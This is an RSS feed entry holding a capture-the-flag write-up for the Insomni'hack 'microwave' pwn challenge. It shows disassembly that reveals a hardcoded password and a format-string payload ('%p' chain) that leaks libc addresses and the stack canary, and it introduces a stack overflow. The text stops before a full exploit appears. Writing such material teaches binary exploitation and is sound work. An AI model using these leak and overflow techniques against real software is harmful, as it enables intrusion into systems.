<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>deadc0de.re</title><link>https://deadc0de.re/</link><description>... rocking out ...</description><atom:link href="https://deadc0de.re/feeds/all.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 21 Mar 2016 00:00:00 +0100</lastBuildDate><item><title>Insomni'hack microwave write-up</title><link>https://deadc0de.re/articles/microwave-write-up.html</link><description>&lt;p&gt;This is a write-up for the &lt;em&gt;microwave&lt;/em&gt; pwn of
&lt;a href="https://insomnihack.ch/"&gt;Insomni'hack&lt;/a&gt; CTF.&lt;/p&gt;
&lt;p&gt;Following binaries were given:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;microwave_61f50dba931bb10ab3089215b2e188f4&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;libc.so.6&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those are both available &lt;a href="https://github.com/deadc0de6/ctf/tree/master/2016-insomnihack"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;The program simulates a microwave able to connect to twitter
and tweets your favorite food.&lt;/p&gt;
&lt;p&gt;There are 4 options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) &lt;em&gt;Connect to Twitter account&lt;/em&gt;: asks for username and password
    to connect to twitter&lt;/li&gt;
&lt;li&gt;(2) &lt;em&gt;Edit your tweet&lt;/em&gt;: edit content of the tweet(s) to be sent&lt;/li&gt;
&lt;li&gt;(3) &lt;em&gt;Grill &amp;amp; Tweet your food&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;(4) &lt;em&gt;Exit&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Connect to twitter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt; &lt;span class="o"&gt;--------------------------------------------------------&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="nx"&gt;Welcome&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt; &lt;span class="nx"&gt;generation&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;MicroWaves&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;    &lt;span class="o"&gt;|&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;                         &lt;span class="o"&gt;***&lt;/span&gt;                          &lt;span class="o"&gt;|&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;This&lt;/span&gt; &lt;span class="nx"&gt;stylish&lt;/span&gt; &lt;span class="nx"&gt;Microwave&lt;/span&gt; &lt;span class="kd"&gt;with&lt;/span&gt; &lt;span class="nx"&gt;Grill&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;includes&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;that&lt;/span&gt; &lt;span class="nx"&gt;tweets&lt;/span&gt; &lt;span class="nx"&gt;your&lt;/span&gt; &lt;span class="nx"&gt;favourite&lt;/span&gt; &lt;span class="nx"&gt;food&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;                         &lt;span class="o"&gt;***&lt;/span&gt;                          &lt;span class="o"&gt;|&lt;/span&gt;
 &lt;span class="o"&gt;--------------------------------------------------------&lt;/span&gt;
           &lt;span class="o"&gt;----------------------------------&lt;/span&gt;
           &lt;span class="o"&gt;|&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Connect&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;Twitter&lt;/span&gt; &lt;span class="nx"&gt;account&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
           &lt;span class="o"&gt;|&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Edit&lt;/span&gt; &lt;span class="nx"&gt;your&lt;/span&gt; &lt;span class="nx"&gt;tweet&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;
           &lt;span class="o"&gt;|&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Grill&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;Tweet&lt;/span&gt; &lt;span class="nx"&gt;your&lt;/span&gt; &lt;span class="nx"&gt;food&lt;/span&gt;    &lt;span class="o"&gt;|&lt;/span&gt;
           &lt;span class="o"&gt;|&lt;/span&gt;  &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Exit&lt;/span&gt;                       &lt;span class="o"&gt;|&lt;/span&gt;
           &lt;span class="o"&gt;----------------------------------&lt;/span&gt;

           &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;MicroWave&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

           &lt;span class="nx"&gt;Log&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;on&lt;/span&gt; &lt;span class="nx"&gt;Twitter&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
           &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;
           &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;

&lt;span class="nx"&gt;Checking&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;
&lt;span class="nx"&gt;Twitter&lt;/span&gt; &lt;span class="nx"&gt;account&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Edit your tweet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp;amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 2

           #&amp;gt; some blabla

           Done.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Grill and tweet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp;amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 3



  Okay! Let&amp;#39;s do this!
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here are the protections of the binary&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;checksec microwave_61f50dba931bb10ab3089215b2e188f4
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/tmp/microwave_61f50dba931bb10ab3089215b2e188f4&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The vulnerabilities&lt;/h2&gt;
&lt;h3&gt;Find the password&lt;/h3&gt;
&lt;p&gt;First we need a valid username/password to connect to the fake
twitter account. The username can be anything, however the function
containing the &lt;em&gt;Checking&lt;/em&gt; string shows where the password is checked
(and what it is):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;iz&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;Checking&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;axt&lt;/span&gt; &lt;span class="mh"&gt;0x00002ac0&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="mh"&gt;0xf03&lt;/span&gt; &lt;span class="n"&gt;lea&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1bb6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt; &lt;span class="mh"&gt;@0xf03&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

      &lt;span class="mh"&gt;0x00000f98&lt;/span&gt;      &lt;span class="mi"&gt;488&lt;/span&gt;&lt;span class="n"&gt;b1d713020&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x203071&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x204010&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2b56&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n07_7h3_fl46&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;V&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000f9f&lt;/span&gt;      &lt;span class="mi"&gt;4889&lt;/span&gt;&lt;span class="n"&gt;df&lt;/span&gt;         &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000fa2&lt;/span&gt;      &lt;span class="n"&gt;e849faffff&lt;/span&gt;     &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;sym&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strlen&lt;/span&gt;         &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000fa7&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;d2&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;
  &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;=&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fa9&lt;/span&gt;      &lt;span class="n"&gt;eb13&lt;/span&gt;           &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="mh"&gt;0xfbe&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fab&lt;/span&gt;      &lt;span class="mf"&gt;0f1f&lt;/span&gt;&lt;span class="mi"&gt;440000&lt;/span&gt;     &lt;span class="n"&gt;nop&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rax&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fc1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fb0&lt;/span&gt;      &lt;span class="mf"&gt;0f&lt;/span&gt;&lt;span class="n"&gt;b60c13&lt;/span&gt;       &lt;span class="n"&gt;movzx&lt;/span&gt; &lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="c1"&gt;// LOAD THE PASSWORD CHAR&lt;/span&gt;
 &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fb4&lt;/span&gt;      &lt;span class="mi"&gt;384&lt;/span&gt;&lt;span class="n"&gt;c1528&lt;/span&gt;       &lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;cl&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0xa&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;// COMPARE PROVIDED PASSWORD CHAR&lt;/span&gt;
&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;===&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fb8&lt;/span&gt;      &lt;span class="mi"&gt;752&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xfe8&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fba&lt;/span&gt;      &lt;span class="mi"&gt;4883&lt;/span&gt;&lt;span class="n"&gt;c201&lt;/span&gt;       &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;                     &lt;span class="c1"&gt;// NEXT CHAR&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fa9&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fbe&lt;/span&gt;      &lt;span class="mi"&gt;4839&lt;/span&gt;&lt;span class="n"&gt;c2&lt;/span&gt;         &lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;                   &lt;span class="c1"&gt;// CHECK REACH END OF STRING&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;==&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fc1&lt;/span&gt;      &lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="n"&gt;ed&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xfb0&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;// GO ON&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="mh"&gt;0x00000fc3&lt;/span&gt;      &lt;span class="n"&gt;b801000000&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="mh"&gt;0x00000fc8&lt;/span&gt;      &lt;span class="mi"&gt;6689453&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;       &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;arg_3ch&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;ax&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x3c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;// RETURN VALUE 1&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fee&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fcc&lt;/span&gt;      &lt;span class="mi"&gt;488&lt;/span&gt;&lt;span class="n"&gt;b442408&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rsp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fd1&lt;/span&gt;      &lt;span class="mf"&gt;644833042528.&lt;/span&gt;  &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="nl"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="mh"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;==&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fda&lt;/span&gt;      &lt;span class="mi"&gt;7514&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xff0&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fdc&lt;/span&gt;      &lt;span class="mi"&gt;4883&lt;/span&gt;&lt;span class="n"&gt;c410&lt;/span&gt;       &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;                                                               &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fe8&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;d2&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;
 &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fea&lt;/span&gt;      &lt;span class="mi"&gt;6689553&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;       &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;arg_3ch&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x3c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;// RETURN VALUE 0&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;=&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fee&lt;/span&gt;      &lt;span class="n"&gt;ebdc&lt;/span&gt;           &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="mh"&gt;0xfcc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The password is thus &lt;code&gt;n07_7h3_fl46&lt;/code&gt;.
It was however possible to "see" it using a simple &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Vuln1: string format&lt;/h3&gt;
&lt;p&gt;The first vulnerability is a string format on the username when
connecting to twitter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt; --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  1. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  2. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  3. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: 1

           Log in on Twitter:
           username: %p.%p.%p.%p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b0ce50.0x7ffff7fd8700.0x555555556ac0.&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;.0xeaa546f902a74f00.0x7ffff7dd7710.0x7ffff7dd7718
Twitter account
............
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is thus possible to read up the stack. The leaked values are indeed interesting
and will be used later:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;0x7ffff7...&lt;/em&gt; look like libc addresses&lt;/li&gt;
&lt;li&gt;&lt;em&gt;0xeaa546f902a74f00&lt;/em&gt; looks like the canary&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Vuln2: stack overflow&lt;/h3&gt;
&lt;p&gt;The second vulnerability is triggered when reading the content to tweet.
It reads from stdin (0) and store the result on the stack&lt;/p&gt;
